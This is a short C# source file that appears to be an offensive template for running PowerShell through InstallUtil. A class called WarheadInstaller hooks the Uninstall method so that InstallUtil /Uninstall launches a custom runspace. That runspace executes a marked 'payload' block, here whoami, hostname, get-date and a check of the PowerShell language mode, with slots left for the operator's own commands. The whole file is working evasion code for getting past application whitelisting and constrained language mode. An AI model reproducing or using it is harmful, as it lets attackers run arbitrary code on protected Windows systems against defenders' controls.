using System;
using System.Configuration.Install;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

[System.ComponentModel.RunInstaller(true)]
public class WarheadInstaller : Installer
{
    // This gets triggered when running /Uninstall
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Code.Main();
    }
}

public class Code
{
    // Main method to execute the payload
    public static void Main()
    {
        using (var runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();

            using (var PWSH = PowerShell.Create())
            {
                PWSH.Runspace = runspace;

                // Start
                string Command = @"
                
                whoami
                hostname
                get-date
                $ExecutionContext.SessionState.LanguageMode
                
                ";
                // End

                PWSH.AddScript(Command);

                var results = PWSH.Invoke();
                var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());

                Console.WriteLine(output);
            }
        }
    }
}
